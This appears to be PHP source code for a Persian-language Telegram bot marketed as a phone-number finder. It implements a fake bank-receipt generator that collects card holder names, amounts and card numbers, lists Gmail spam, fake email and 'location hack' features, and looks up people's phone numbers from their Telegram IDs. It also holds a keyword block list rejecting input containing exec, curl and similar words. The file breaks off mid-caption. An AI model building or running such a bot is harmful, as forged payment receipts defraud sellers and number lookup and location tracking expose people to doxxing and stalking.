<?php
/* ==============================
* 📬 Telegram: @Abolfazl_rwm — ⚠️ استفاده، ویرایش و بازنشر فقط با ذکر منبع مجاز است؛ حذف این اعتبار اجازه نمی‌شود
* Use, edit and redistribute only with attribution to @Abolfazl_rwm.
* ============================== */

error_reporting(E_ALL);
http_response_code(200);
litespeed_finish_request();
include("jdf.php");
include("text.php");
define('API_KEY','"PUT-YOUR-BOT-TOKEN"');
//===[امنیت دامنه]===//
$telegram_ip_ranges = [
['lower' => '149.154.160.0', 'upper' => '149.154.175.255'], // literally 149.154.160.0/20
['lower' => '91.108.4.0',    'upper' => '91.108.7.255'],    // literally 91.108.4.0/22
];

$ip_dec = (float) sprintf("%u", ip2long($_SERVER['REMOTE_ADDR']));
$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if(!$ok){
if(!$ok){
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if($ip_dec >= $lower_dec and $ip_dec <= $upper_dec)
{
$ok=true;
}
}
}
if(!$ok){
exit(header("location: https://Google.com"));
}
//===[فانکشن های لازم]===//
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
function GetRanks($file){
$users = scandir('data/');
$users = array_diff($users,[".",".."]);
$coins =[];
foreach($users as $user){
$coin = json_decode(file_get_contents('data/'.$user.'/'.$user.'.json'),true)["$file"];
$coins[$user] = $coin;
}
arsort($coins);
foreach($coins as $key => $user){
$i++;
if($i == 11) break;
$list[] = array('user'=>$key,'coins'=>$coins[$key]);
}
return $list;
}
function Random(){
$container = 'QWERTYUIOPLKJHGFDSAZCXVBNM';
$key = '';
for($i = 0;$i < 6;$i++){
$_rand = rand(0,strlen($container)-1);
$key .= substr($container, $_rand, 1);
}
return $key;
}
function DeleteFolder($path){
if($handle=opendir($path)){
while(false!==($file=readdir($handle))){
if($file<>"." AND $file<>".."){ 
if(is_file($path.'/'.$file)){
@unlink($path.'/'.$file);
}
if(is_dir($path.'/'.$file)){
DeleteFolder($path.'/'.$file);
@rmdir($path.'/'.$file);
}
}
}
}
}
function GetProfile($from_id){
$url = "https://api.telegram.org/bot".API_KEY."/getUserProfilePhotos?user_id=".$from_id;
$result = json_decode(file_get_contents($url));
$result = $result->result->photos[0][0]->file_id;
if($result == true){
return $result;
}else{
return 'false';
}
}
function Number($string){
$persian = ['۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹'];
$arabic = ['٩', '٨', '٧', '٦', '٥', '٤', '٣', '٢', '١','٠'];
$num = range(0, 9);
$NumberedPersianNums = str_replace($persian, $num, $string);
$englishNumbersOnly = str_replace($arabic, $num, $NumberedPersianNums);
if(is_numeric($englishNumbersOnly)){
$englishNumbersOnly = preg_replace('![^\d]*!',null,$englishNumbersOnly);
}
return $englishNumbersOnly;
}
function Security($text){
global $admin;
global $from_id;
if(!in_array($from_id,$admin)){
if(strpos($text,'api') !== false or strpos($text,'tok') !== false){
return 'ok';
}
if(strpos($text,'update') !== false or strpos($text,'getme') !== false){
return 'ok';
}
if(strpos($text,'include') !== false or strpos($text,'foreach') !== false){
return 'ok';
}
if(strpos($text,'input') !== false or strpos($text,'exec') !== false){
return 'ok';
}
if(strpos($text,'json') !== false or strpos($text,'curl') !== false){
return 'ok';
}
if(strpos($text,'php') !== false or strpos($text,'zip') !== false){
return 'ok';
}
if(strpos($text,'http') !== false or strpos($text,'telegram') !== false){
return 'ok';
}
if(strpos($text,'archive') !== false or strpos($text,'function') !== false){
return 'ok';
}
if(strpos($text,'#') !== false or strpos($text,"'") !== false){
return 'ok';
}
if(strpos($text,'$') !== false or strpos($text,'"') !== false){
return 'ok';
}
if(strpos($text,'(') !== false or strpos($text,')') !== false){
return 'ok';
}
if(strpos($text,'[') !== false or strpos($text,']') !== false){
return 'ok';
}
}
return 'no';
}
//===[متغیر های اطلاعات ربات]===//
$get = bot('getMe');
$botid = $get->result->id;
$botuser = $get->result->username;
$botname = $get->result->first_name;
//===[تاریخ و ساعت]===//
$day_name = jdate('l');
$date = jdate("Y/m/d");
$time = jdate("H:i:s");
//===[متغیر های لازم]===//
$update = json_decode(file_get_contents('php://input'));
if(isset($update->message)){
$chat_id = $update->message->chat->id;
$text = Number($update->message->text);
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$tc = $update->message->chat->type;
$reply = $update->message->reply_to_message;
$reply_id = $update->message->reply_to_message->from->id;
$first_name = $update->message->from->first_name;
$last_name = $update->message->from->last_name;
$user_name = $update->message->from->username ?? '𝑛𝑜𝑛𝑒';
}
if(isset($update->callback_query)){
$chat_id = $update->callback_query->message->chat->id;
$data = $update->callback_query->data;
$user_id = $update->callback_query->id;
$tc = $update->callback_query->message->chat->type;
$message_id = $update->callback_query->message->message_id;
$from_id = $update->callback_query->from->id;
$first_name = $update->callback_query->from->first_name;
$last_name = $update->callback_query->from->last_name;
$user_name = $update->callback_query->from->username ?? '𝑛𝑜𝑛𝑒';
}
if(isset($update->inline_query)){
$inline = $update->inline_query;
$user_id = $update->inline_query->id;
$query = $update->inline_query->query;
$tc = $update->inline_query->message->chat->type;
$from_id = $update->inline_query->from->id;
$first_name = $update->inline_query->from->first_name;
$last_name = $update->inline_query->from->last_name;
$user_name = $update->inline_query->from->username ?? '𝑛𝑜𝑛𝑒';
}
$admin = array("971881348"); // ای دی عددی ادمین ها
$domain = "https://api-bot.site";
//===[امنیت]===//
if(Security($update->message->text) == 'ok') exit();
//===[ساخت دیتا]===//
if(!file_exists("data")){
mkdir("data");
}
if(!file_exists("gap")){
mkdir("gap");
}
if(!file_exists("data/$from_id")){
mkdir("data/$from_id");
}
$datas = json_decode(file_get_contents("data/$from_id/$from_id.json"),true);
$step = $datas["step"];
$warn = $datas["warn"];
$coin = $datas["coin"];
$type = $datas["type"];
$inv = $datas["inv"];
$gap = json_decode(file_get_contents("gap/$chat_id/$chat_id.json"),true);
$ben = file_get_contents("data/ben.txt") ?: '0';
$file = json_decode(file_get_contents('data.json'),true);
$tags = $file["$from_id"]['tags'] ?? null;
$free = $file["$from_id"]['free'] ?? null;
$timeJs = json_decode(file_get_contents('time.json'),true);
$link = $timeJs["$from_id"]['link'] ?? null;
$bio = $timeJs["$from_id"]['bio'] ?? null;
//===[ کیبورد ]===//
$menu = json_encode(['keyboard'=>[
[['text'=>"🌟 | بخش ویژه ربات"],['text'=>"🌐 | اطلاعات کرونا"]],
[['text'=>"🛍 | حساب کاربری"],['text'=>"🎉 | زیر مجموعه"]],
[['text'=>"🔍 | جستجوی شماره"],['text'=>"🔰 | شماره من"]],
[['text'=>"💭 | چت گروهی"]],
[['text'=>"💛 | آموزش تصویری"],['text'=>"💳 | صحت کارت بانکی"]],
[['text'=>"📚 | راهنما"],['text'=>"🆘 | پشتیبانی"]],
],'resize_keyboard'=>true,
'input_field_placeholder'=>"🔍 منوی اصلی . . ."
]);

$vipkey = json_encode(['keyboard'=>[
[['text' => "🔖 | رسید فیک"]],
[['text'=>"💤 | اسپم جیمیل"],['text'=>"📧 | ایمیل فیک"]],
[['text'=>"🔐 | اطلاعات آیپی"],['text'=>"⏰ | تایم بیو کانال"]],
[['text'=>"🌐 | پروکسی HTTPS"],['text'=>"💫 | اینستاگرام"]],
[['text'=>"🌏 | هک لوکیشن"],['text'=>"🔗 | تگ گیر"]],
[['text'=>"🔰 | دیکدر"],['text'=>"🔰 | انکدر"]],
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
'input_field_placeholder'=>"🌟 منوی VIP . . ."
]);

$keyback = json_encode(['keyboard'=>[
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
]);

$keyPanel = json_encode(['keyboard'=>[
[['text'=>"📊 | آمار ربات"]],
[['text'=>"❌ | آن بن"],['text'=>"✅ | بن"]],
[['text'=>"📉 | کسر امتیاز کاربر"],['text'=>"📈 | افزایش امتیاز کاربر"]],
[['text'=>"⚜ | فوروارد همگانی"],['text'=>"🔰 | پیام همگانی"]],
[['text'=>"🔐 | کانال اول"],['text'=>"🔐 | کانال دوم"]],
[['text'=>"🔆 | متن استارت"],['text'=>"📚 | متن راهنما"]],
[['text'=>"❗️| اخطار به کاربر"],['text'=>"❕| حذف اخطار کاربر"]],
[['text'=>"🗑 | حذف هک لوکیشن ها"]],
[['text'=>"⏺ | روشن"],['text'=>"💤 | خاموش"]],
[['text'=>"🗑 | حذف ویژه"],['text'=>"🔑 | ویژه کردن"]],
[['text'=>"✔️ | بستن چت گروهی"]],
[['text'=>"🎁 | امتیاز همگانی"],['text'=>"🖥 | پیام به کاربر"]],
[['text'=>"🔙 | بازگشت"]],
],'resize_keyboard'=>true]);

$KeyBackPanel = json_encode(['keyboard'=>[
[['text'=>"🔙 | بازگشت به منو"]],
],'resize_keyboard'=>true]);
//===[ کدهای اینلاین ]===//
if(strpos($data,'report-') !== false){
$id = str_replace('report-',null,$data);
if($id != $from_id){
$reportname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$reportnamer = $reportname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
⚠️ شما درحال گزارش کاربر ( `$reportnamer` ) هستید لطفاً دلیل گزارش خود را انتخاب کنید ؟ 
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"❗️بی احترامی",'callback_data'=>"biaht$id"]],
[['text'=>"❗️فحاشی",'callback_data'=>"fosh$id"]],
[['text'=>"❗️به هم ریختن نظم چت",'callback_data'=>"nazm$id"]],
[['text'=>"❗️مسخره کردن",'callback_data'=>"funer$id"]],
[['text'=>"❗️تبلیغات",'callback_data'=>"adser$id"]],
[['text'=>"🔙 بازگشت ",'callback_data'=>"BackChat"]],
]])
]);
}else{
bot('answercallbackquery', [
'callback_query_id' =>$user_id,
'text' => "🌹 شما خودتان را نمیتوانید گزارش کنید !",
'show_alert' =>false
]);
}
}
if(strpos($data,'biaht') !== false){
$id = str_replace('biaht',null,$data);
$reportname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$reportnamer = $reportname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
✅ با موفقیت کاربر ( `$reportnamer` ) به دلیل *( ❗️بی احترامی )* گزارش شد !
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$admin[0],
'text'=>"
🎈 یک نفر گزارش شده است !


⚠️ فرد که گزارش شده است : 


✅ ای دی عددی : `$id`
✅ اسم کاربر : `$reportnamer`
✅ دلیل گزارش : ❗️بی احترامی


🎯 فردی که گزارش کرده است : 

✅ ای دی عددی : `$from_id`
✅ اسم کاربر : `$first_name`
✅ یوزرنیم کاربر : *@$user_name*


*♻️ این گزارش در ساعت $time و در تاریخ $date ثبت شده است !*
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"⚠️ اخطار به این فرد",'callback_data'=>"akhtar$id"]],
[['text'=>"🔰 پیام به این فرد",'callback_data'=>"psm$id"]],
[['text'=>"📑 پیام به گزارش دهنده",'callback_data'=>"grazesh$from_id"]],
]])
]);
exit();
}
if(strpos($data,'fosh') !== false){
$id = str_replace('fosh',null,$data);
$reportname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$reportnamer = $reportname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
✅ با موفقیت کاربر ( `$reportnamer` ) به دلیل *( ❗️فحاشی )* گزارش شد !
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$admin[0],
'text'=>"
🎈 یک نفر گزارش شده است !


⚠️ فرد که گزارش شده است : 


✅ ای دی عددی : `$id`
✅ اسم کاربر : `$reportnamer`
✅ دلیل گزارش : ❗️فحاشی


🎯 فردی که گزارش کرده است : 

✅ ای دی عددی : `$from_id`
✅ اسم کاربر : `$first_name`
✅ یوزرنیم کاربر : *@$user_name*


*♻️ این گزارش در ساعت $time و در تاریخ $date ثبت شده است !*
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"⚠️ اخطار به این فرد",'callback_data'=>"akhtar$id"]],
[['text'=>"🔰 پیام به این فرد",'callback_data'=>"psm$id"]],
[['text'=>"📑 پیام به گزارش دهنده",'callback_data'=>"grazesh$from_id"]],
]])
]);
exit();
}
if(strpos($data,'nazm') !== false){
$id = str_replace('nazm',null,$data);
$reportname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$reportnamer = $reportname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
✅ با موفقیت کاربر ( `$reportnamer` ) به دلیل *( ❗️به هم ریختن نظم چت )* گزارش شد !
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$admin[0],
'text'=>"
🎈 یک نفر گزارش شده است !


⚠️ فرد که گزارش شده است : 


✅ ای دی عددی : `$id`
✅ اسم کاربر : `$reportnamer`
✅ دلیل گزارش : ❗️به هم ریختن نظم چت


🎯 فردی که گزارش کرده است : 

✅ ای دی عددی : `$from_id`
✅ اسم کاربر : `$first_name`
✅ یوزرنیم کاربر : *@$user_name*


*♻️ این گزارش در ساعت $time و در تاریخ $date ثبت شده است !*
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"⚠️ اخطار به این فرد",'callback_data'=>"akhtar$id"]],
[['text'=>"🔰 پیام به این فرد",'callback_data'=>"psm$id"]],
[['text'=>"📑 پیام به گزارش دهنده",'callback_data'=>"grazesh$from_id"]],
]])
]);
exit();
}
if(strpos($data,'funer') !== false){
$id = str_replace('funer',null,$data);
$reportname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$reportnamer = $reportname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
✅ با موفقیت کاربر ( `$reportnamer` ) به دلیل *( ❗️مسخره کردن )* گزارش شد !
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$admin[0],
'text'=>"
🎈 یک نفر گزارش شده است !


⚠️ فرد که گزارش شده است : 


✅ ای دی عددی : `$id`
✅ اسم کاربر : `$reportnamer`
✅ دلیل گزارش : ❗️مسخره کردن


🎯 فردی که گزارش کرده است : 

✅ ای دی عددی : `$from_id`
✅ اسم کاربر : `$first_name`
✅ یوزرنیم کاربر : *@$user_name*


*♻️ این گزارش در ساعت $time و در تاریخ $date ثبت شده است !*
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"⚠️ اخطار به این فرد",'callback_data'=>"akhtar$id"]],
[['text'=>"🔰 پیام به این فرد",'callback_data'=>"psm$id"]],
[['text'=>"📑 پیام به گزارش دهنده",'callback_data'=>"grazesh$from_id"]],
]])
]);
exit();
}
if(strpos($data,'adser') !== false){
$id = str_replace('adser',null,$data);
$reportname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$reportnamer = $reportname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
✅ با موفقیت کاربر ( `$reportnamer` ) به دلیل *( ❗️تبلیغات )* گزارش شد !
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$admin[0],
'text'=>"
🎈 یک نفر گزارش شده است !


⚠️ فرد که گزارش شده است : 


✅ ای دی عددی : `$id`
✅ اسم کاربر : `$reportnamer`
✅ دلیل گزارش : ❗️تبلیغات


🎯 فردی که گزارش کرده است : 

✅ ای دی عددی : `$from_id`
✅ اسم کاربر : `$first_name`
✅ یوزرنیم کاربر : *@$user_name*


*♻️ این گزارش در ساعت $time و در تاریخ $date ثبت شده است !*
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"⚠️ اخطار به این فرد",'callback_data'=>"akhtar$id"]],
[['text'=>"🔰 پیام به این فرد",'callback_data'=>"psm$id"]],
[['text'=>"📑 پیام به گزارش دهنده",'callback_data'=>"grazesh$from_id"]],
]])
]);
exit();
}
if(strpos($data,'pm-') !== false){
$id = str_replace('pm-',null,$data);
if($id != $from_id){
$datas["step"] = "pvm-$id";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$pmname = bot('getChatMember',['chat_id'=>"$id",'user_id'=>"$id"]);
$pmnamer = $pmname->result->user->first_name;
bot('EditMessageText',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
'text'=>"
💭 شما درحال ارسال پیام به کاربر ( `$pmnamer` ) هستید . . . 
",
'parse_mode'=>'MarkDown',
'reply_markup' => json_encode(['inline_keyboard'=>[
[['text'=>"🔙 بازگشت ",'callback_data'=>"BackChat"]],
]])
]);
}else{
bot('answercallbackquery', [
'callback_query_id' =>$user_id,
'text' => "🔰 شما نمیتوانید به خودتان پیام ارسال کنید !",
'show_alert' =>false
]);
}
}
if($data == "BackChat"){
bot('deleteMessage',[
'chat_id'=>$from_id,
'message_id'=>$message_id,
]);
}
$fakeres = ['mellat','seke','app','kaq','hafash','bale','top','digipay','eva','kif'];
if(in_array($data,$fakeres)){
$resid = str_replace($fakeres,[1,2,3,4,5,6,7,8,9,12],$data);
$datas["step"] = "FakeResid-$resid";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('editmessagetext',[
'chat_id'=>$from_id,
'message_id' => $message_id,
'text'=>"
🎈 | درحال پردازش . . . !
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔖 | مثل نمونه زیر ارسال کنید اطلاعات را :

نام صاحب کارت
مقدار کارت به کارت به ریال
چهار رقم اخر شماره کارت مبدا
شماره کارت مقصد

🔐 | مثال :

`مستر ایکسـ
10000
6044
6037666412796044`
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyback
]);
}
//===[ کامنت اول ]===//
if($from_id == 777000 and isset($update->message)){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🥇",
'reply_to_message_id'=>$message_id,
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🥈",
'reply_to_message_id'=>$message_id,
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🥉",
'reply_to_message_id'=>$message_id,
]);
bot('sendSticker',[
'chat_id'=>$from_id,
'sticker'=>"https://t.me/Mafia_nit/81",
'reply_to_message_id'=>$message_id,
]);
exit();
}
//===[خاموش ربات و بن فرد]===//
if($warn >= 3){
exit();
}
if($onof == "off" and !in_array($from_id,$admin)){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🤖 | ربات موقتا خاموش میباشد
",
]);
exit();
}
//===[تاریخ]===//
function Spam($from_id){
$spam_status = json_decode(file_get_contents("data/$from_id/spam.json"),true);
if($spam_status != null){
if(mb_strpos($spam_status[0],"time") !== false){
if(str_replace("time ",null,$spam_status[0]) >= time())
exit();
else
$spam_status = [1,time()+1];
}
elseif(time() < $spam_status[1]){
if($spam_status[0]+1 > 1){
$time = time() + 0;
$spam_status = ["time $time"];
file_put_contents("data/$from_id/spam.json",json_encode($spam_status,true));
bot('SendMessage',[
'chat_id'=>$from_id,
'text'=>"💯 لطفاً آهسته تر با ربات کار کنید",
]);
exit();
}else{
$spam_status = [$spam_status[0]+1,$spam_status[1]];
}
}else{
$spam_status = [1,time()+1];
}
}else{
$spam_status = [1,time()+1];
}
file_put_contents("data/$from_id/spam.json",json_encode($spam_status,true));
}
if($tc == 'private') Spam($from_id);
//===[جوین اجباری]===//
$channel = file_get_contents("channel.txt");
$channel2 = file_get_contents("channel2.txt");
$joincha = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$channel&user_id=".$from_id));
$joqw = $joincha->result->status;
$joinch = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$channel2&user_id=".$from_id));
$joqwe = $joinch->result->status;
//===[ربات]===//
if(strpos($text,"/start") !== false and $text != "/start" and $tc == 'private'){
$id = str_replace("/start ","",$text);
$amar = file_get_contents("data/datahU.txt");
$exp = explode("\n",$amar);
if(!in_array($from_id,$exp) and $from_id != $id and in_array($id,$exp)){
$myfile2 = fopen("data/datahU.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "$from_id\n");
fclose($myfile2);
$datas["join"] = "$id";
$datas["inv"] = "0";
$datas["warn"] = "0";
$datas["coin"] = "0";
$datas["step"] = "free";
$datas["type"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
$texst
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu
]);
exit();
}
}
if(!file_exists("data/$from_id/$from_id.json")){
$myfile2 = fopen("data/datahU.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "$from_id\n");
fclose($myfile2);
$datas["inv"] = "0";
$datas["warn"] = "0";
$datas["coin"] = "0";
$datas["step"] = "free";
$datas["type"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
}
if($text == "/start" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
$texst
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu
]);
exit();
}
if(file_exists("channel.txt") and file_exists("channel2.txt") and $tc == 'private'){
if($joqw != 'member' and $joqw != 'creator' and $joqw != 'administrator' or $joqwe != 'member' and $joqwe != 'creator' and $joqwe != 'administrator'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🖥 | جهت استفاده از ربات ابتدا در کانال های ربات عضو شوید

🆑 | @$channel

🆑 | @$channel2
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text' => "🧡 1 🧡", 'url' => "https://t.me/$channel"],['text' => "💛 2 💛", 'url' => "https://t.me/$channel2"]],
],
])
]);
exit();
}
}
if(isset($datas["join"])){
$id = $datas["join"];
$invite = json_decode(file_get_contents("data/$id/$id.json"),true);
$invite["inv"] += "1";
$invite["coin"] += "1";
$outjson = json_encode($invite,true);
file_put_contents("data/$id/$id.json",$outjson);
unset($datas["join"]);
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$id,
'text'=>"🎉 | کاربر `$first_name` با لینک شما وارد ربات شما و شما `1` امتیاز دریافت کردید . . .",
'parse_mode'=>'MarkDown',
]);
}
if($text == "🔙 | بازگشت" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"👈🏻⁩ به منوی اصلی بازگشتید
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu
]);
exit();
}
if($text == "📚 | راهنما" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"$help
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu
]);
exit();
}
if($text == "💛 | آموزش تصویری" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('SendVideo',[
'chat_id'=>$from_id,
'video'=>"https://t.me/slokings/7862",
'caption'=>"
♻️ » ربات مورد نظر برای دریافت ای دی عددی :
 _@userinfobot_


*🔐 » آموزش دریافت ای دی عددی برای جستجوی شماره*

`@$botuser`",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$menu
]);
exit();
}
if($text == "🛍 | حساب کاربری" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$GetProfile = GetProfile($chat_id);
if($GetProfile == 'false'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

✅ | اطلاعات حساب شما در ربات شماره یاب اِسلُو :

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"📑 نام شما : ",'callback_data'=>'prooo']],
[['text'=>"@$user_name",'callback_data'=>'prooo'],['text'=>"🎈 یوزرنیم شما :",'callback_data'=>'prooo']],
[['text'=>"$from_id",'callback_data'=>'prooo'],['text'=>"♻️ ای دی عددی شما :",'callback_data'=>'prooo']],
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"📊 تعداد امتیاز شما :",'callback_data'=>'prooo']],
[['text'=>"$inv",'callback_data'=>'prooo'],['text'=>"🎉 تعداد زیر مجموعه :",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"🔐 نوع حساب شما :",'callback_data'=>'prooo']],
[['text'=>"$warn",'callback_data'=>'prooo'],['text'=>"❗️تعداد اخطار های شما :",'callback_data'=>'prooo']],
[['text' => "🎈 اشتراک گذاری حساب کاربری🎈",'url' => "https://telegram.me/share/url?url= id : $from_id / coin : $coinموجودی%20من%20و%20ایدی%20عددی%20من%20در%20ربات%20@$botuser"]],
[['text'=>"•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•",'callback_data'=>'prooo']],
[['text'=>"$date",'callback_data'=>'prooo'],['text'=>'📆 تاریخ ◄','callback_data'=>'prooo']],
[['text'=>"$time",'callback_data'=>'prooo'],['text'=>'⏰ ساعت ◄','callback_data'=>'prooo']],
[['text'=>"•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•",'callback_data'=>'prooo']],
]
])
]);
}else{
bot('SendPhoto',[
'chat_id'=>$from_id,
'photo'=>$GetProfile,
'caption'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

✅ | اطلاعات حساب شما در ربات شماره یاب اِسلُو :

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"📑 نام شما : ",'callback_data'=>'prooo']],
[['text'=>"@$user_name",'callback_data'=>'prooo'],['text'=>"🎈 یوزرنیم شما :",'callback_data'=>'prooo']],
[['text'=>"$from_id",'callback_data'=>'prooo'],['text'=>"♻️ ای دی عددی شما :",'callback_data'=>'prooo']],
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"📊 تعداد امتیاز شما :",'callback_data'=>'prooo']],
[['text'=>"$inv",'callback_data'=>'prooo'],['text'=>"🎉 تعداد زیر مجموعه :",'callback_data'=>'prooo']],
[['text'=>"$type",'callback_data'=>'prooo'],['text'=>"🔐 نوع حساب شما :",'callback_data'=>'prooo']],
[['text'=>"$warn",'callback_data'=>'prooo'],['text'=>"❗️تعداد اخطار های شما :",'callback_data'=>'prooo']],
[['text' => "🎈 اشتراک گذاری حساب کاربری🎈",'url' => "https://telegram.me/share/url?url= id : $from_id / coin : $coinموجودی%20من%20و%20ایدی%20عددی%20من%20در%20ربات%20@$botuser"]],
[['text'=>"•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•",'callback_data'=>'prooo']],
[['text'=>"$date",'callback_data'=>'prooo'],['text'=>'📆 تاریخ ◄','callback_data'=>'prooo']],
[['text'=>"$time",'callback_data'=>'prooo'],['text'=>'⏰ ساعت ◄','callback_data'=>'prooo']],
[['text'=>"•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•",'callback_data'=>'prooo']],
]
])
]);
}
}
if($text == "🎉 | زیر مجموعه" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🍻 | از منوی پایین یک گزینه را انتخاب کنید . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"🎊 | زیر مجموعه گیری"]],
[['text'=>"🎗 | برترین های زیر مجموعه"]],
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
exit();
}
if($text == "🎊 | زیر مجموعه گیری" and $tc == 'private'){
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('SendPhoto',[
'chat_id'=>$from_id,
'photo'=>"https://t.me/slokings/7864",
'caption'=>"
🔰 ⟩ شماره یاب | اِسلُو فایندر 

✅ | امنیت بالا 
✅ | سرعت بالا 
✅ | دیتابیس کامل شماره ها 
